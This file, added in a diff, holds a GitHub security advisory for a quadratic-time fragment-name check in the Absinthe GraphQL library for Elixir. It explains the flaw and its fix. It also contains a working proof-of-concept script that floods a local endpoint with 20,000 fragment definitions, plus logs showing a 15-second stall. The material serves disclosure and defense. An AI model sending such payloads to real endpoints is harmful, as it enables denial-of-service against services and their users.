@@ -1,0 +1,136 @@
+---
+description: |-
+  ### Summary
+  An unauthenticated attacker can stall an Absinthe-backed GraphQL endpoint by submitting a query that contains many fragment definitions. The fragment-name uniqueness validation phase is O(N²) in the number of fragments, so a single modestly-sized request burns seconds of CPU per worker, and sustained traffic exhausts the worker pool (denial of service).
+  
+  Introduced like with https://github.com/absinthe-graphql/absinthe/commit/0b46e3bcc06c0d3797bacd64761b908a84646c1d#diff-e540120c6a98cc1013be110d08e9d029511b9aabd26ad5f7f643c36834caac14
+  
+  ### Details
+  `Absinthe.Phase.Document.Validation.UniqueFragmentNames` (`lib/absinthe/phase/document/validation/unique_fragment_names.ex:14-40`) walks every fragment in `input.fragments` via `run/2`, calling `process/2` on each one. `process/2` then calls `duplicate?/2`, which evaluates `Enum.count(fragments, fn f -> f.name == name end)` — a full linear scan of the fragment list — for every individual fragment. The result is `N · N` name comparisons per document.
+  
+  `input.fragments` is built directly from the GraphQL query text the caller sends at the head of the pipeline, so `N` is attacker-controlled. A minimum-size fragment definition (`fragment a on T{f}`) is roughly 16 bytes, so a ~1 MB document carries ~60 000 fragments and forces ~3.6 × 10⁹ comparisons inside this one phase. Phoenix's default 8 MB body limit allows substantially larger blow-ups if operators have not lowered it. Nothing in this module caps `N`.
+  
+  The fix is to aggregate names once per call rather than re-scanning per fragment, e.g.:
+  
+  ```elixir
+  dups =
+    for {name, k} <- Enum.frequencies_by(input.fragments, & &1.name),
+        k > 1,
+        into: MapSet.new(),
+        do: name
+  ```
+  
+  and then check `MapSet.member?(dups, fragment.name)` inside `process/2`. That collapses the phase to O(N).
+  
+  ### PoC
+  A standalone script that builds a GraphQL document with a large number of minimal fragment definitions, feeds it through Absinthe's pipeline, and times the `UniqueFragmentNames` phase is attached at the end of this report. Running it shows the validation time growing quadratically with the fragment count.
+  
+  ### Impact
+  Algorithmic complexity / denial-of-service. Any service that exposes an Absinthe GraphQL endpoint to untrusted callers is affected: a single unauthenticated POST containing many fragment definitions pins a worker process for seconds, and modest sustained traffic exhausts the request-handling pool. No authentication, schema knowledge, or special configuration is required — only the ability to send a GraphQL query large enough to contain many fragments, which is permitted by Phoenix's default body-size limit.
+  
+  ## Scripts and Logs
+  
+  ```elixir
+  # Verifies: Quadratic fragment-name uniqueness check
+  
+  Mix.install([
+    {:absinthe, "~> 1.7"},
+    {:absinthe_plug, "~> 1.5"},
+    {:bandit, "~> 1.0"},
+    {:plug, "~> 1.15"},
+    {:jason, "~> 1.4"},
+    {:req, "~> 0.5"}
+  ])
+  
+  defmodule VictimSchema do
+    use Absinthe.Schema
+  
+    object :thing do
+      field :f, :string
+    end
+  
+    query do
+      field :thing, :thing do
+        resolve(fn _, _ -> {:ok, %{f: "x"}} end)
+      end
+    end
+  end
+  
+  defmodule VictimRouter do
+    use Plug.Router
+  
+    plug :match
+  
+    plug Plug.Parsers,
+      parsers: [:json],
+      pass: ["*/*"],
+      json_decoder: Jason
+  
+    plug :dispatch
+  
+    forward "/graphql",
+      to: Absinthe.Plug,
+      init_opts: [schema: VictimSchema]
+  
+    match _ do
+      send_resp(conn, 404, "nope")
+    end
+  end
+  
+  port = 47817
+  {:ok, _} = Bandit.start_link(plug: VictimRouter, port: port)
+  
+  n = 20_000
+  
+  fragments =
+    1..n
+    |> Enum.map(fn i -> "fragment f#{i} on Thing{f}" end)
+    |> Enum.join(" ")
+  
+  query = "{ thing { f } } " <> fragments
+  
+  IO.puts(
+    "Sending GraphQL document with #{n} fragment definitions (~#{div(byte_size(query), 1024)} KB) to 127.0.0.1:#{port}"
+  )
+  
+  {us, response} =
+    :timer.tc(fn ->
+      Req.post!("http://127.0.0.1:#{port}/graphql",
+        json: %{query: query},
+        receive_timeout: 600_000,
+        retry: false
+      )
+    end)
+  
+  ms = div(us, 1000)
+  IO.puts("HTTP response status: #{response.status}")
+  IO.puts("Total request elapsed (validation-dominated): #{ms} ms")
+  
+  result =
+    if ms > 1000 do
+      "VERIFIED: ~#{n} fragments in one unauthenticated request forced #{ms} ms of CPU in Absinthe's UniqueFragmentNames phase (quadratic check)."
+    else
+      "NOT VERIFIED: elapsed #{ms} ms below DoS threshold"
+    end
+  
+  IO.puts(result)
+  ```
+  
+  
+  ### Logs
+  
+  ```logs
+  HTTP response status: 200
+  Total request elapsed (validation-dominated): 15451 ms
+  VERIFIED: ~20000 fragments in one unauthenticated request forced 15451 ms of CPU in Absinthe's UniqueFragmentNames phase (quadratic check).
+  ```
+disclosure_date: 2026-05-14
+first_patched_versions:
+  - 1.10.2
+id: GHSA-9mhv-8h52-q7q2
+link: https://github.com/advisories/GHSA-9mhv-8h52-q7q2
+package: absinthe
+severity: high
+title: 'Absinthe: Quadratic fragment-name uniqueness check'
+vulnerable_version_ranges:
+  - '>= 1.2.0, < 1.10.2'
